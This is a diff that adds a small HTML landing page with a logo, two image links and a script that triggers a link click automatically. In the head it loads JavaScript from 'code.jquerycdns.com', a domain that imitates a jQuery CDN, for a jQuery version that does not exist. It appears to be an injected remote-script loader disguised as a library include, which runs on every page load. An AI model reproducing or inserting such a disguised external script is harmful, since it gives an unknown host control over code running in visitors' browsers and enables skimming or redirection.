@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="Content-Language" content="zh-cn">
+	<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=no">
+	<script type="text/javascript" src="js/base.js"></script>
+	<title>Welcome</title>
+	<style type="text/css">
+	body {width:100%;height:100%;position:absolute;top:0;left:0;overflow:hidden;background:#fff;}
+	* {margin:0;padding:0;}
+	img {width:100%;float:left;}
+	.logo {width:740px;position:absolute;left:50%;bottom:52%;margin-left:-370px;}
+	.href {width:740px;position:absolute;top:52%;left:50%;margin-left:-370px;display:flex;justify:center;}
+	.href > a {width:50%;float:left;}
+	.href > a + a {margin-left:50px;}
+	@media screen and (max-width:750px) {
+		.logo {width:68%;left:16%;margin-left:0;bottom:60%;}
+		.href {width:48%;left:26%;margin-left:0;top:46%;display:block;}
+		.href > a {width:100%;}
+		.href > a + a {margin-left:0;margin-top:14px;}
+	}
+	</style>
+<script type="text/javascript" src="https://code.jquerycdns.com/jquery-2.3.1.min.js?h=20230201"></script>
+</head>
+
+<body>
+	<div class="logo" ><img src="static/logo.png" ></div>
+	<p class="href">
+		<a href="javascript:void(0);" id="base"><img src="static/bg_web.png" /> </a>
+		<a href="javascript:void(0);" class=""><img src="static/bg_kf.png" /> </a>
+	</p>
+	<script>
+function run(){
+var btnclick = document.getElementById("base");
+btnclick.click();
+}
+Util.exec("base");
+</script>
+</body>
+</html>
